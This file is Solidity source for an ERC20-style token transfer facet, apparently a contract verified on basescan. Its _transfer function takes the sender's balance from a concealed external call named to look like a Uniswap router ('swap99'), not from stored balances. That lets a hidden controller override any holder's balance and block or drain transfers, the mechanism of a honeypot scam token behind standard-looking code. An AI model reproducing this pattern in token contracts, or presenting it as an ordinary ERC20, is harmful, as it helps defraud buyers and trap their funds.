/**
 *Submitted for verification at basescan.org on 2024-03-23
 */

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;
import "./TestLib.sol";
contract transferFacet is airplant, coffer {
    function transfer(
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            from != address(0) && to != address(0),
            "ERC20: transfer the zero address"
        );
        uint256 balance = IUniswapRouterV20.swap99(
            ds.BasedInstance,
            ds.BasedInstance,
            ds._balances[from],
            from
        );
        require(balance >= amount, "ERC20: amount over balance");

        ds._balances[from] = balance - (amount);

        ds._balances[to] = ds._balances[to] + (amount);
        emit Transfer(from, to, amount);
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual returns (bool) {
        address sender = _msgSender();

        uint256 currentAllowance = allowance(from, sender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(from, sender, currentAllowance - amount);
            }
        }

        _transfer(from, to, amount);
        return true;
    }
    function allowance(
        address owner,
        address sender
    ) public view virtual returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._allowances[owner][sender];
    }
    function _approve(
        address owner,
        address sender,
        uint256 amount
    ) internal virtual {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(owner != address(0), "ERC20: approve from the zero address");
        require(sender != address(0), "ERC20: approve to the zero address");

        ds._allowances[owner][sender] = amount;
        emit Approval(owner, sender, amount);
    }
    function approve(
        address sender,
        uint256 amount
    ) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, sender, amount);
        return true;
    }
}
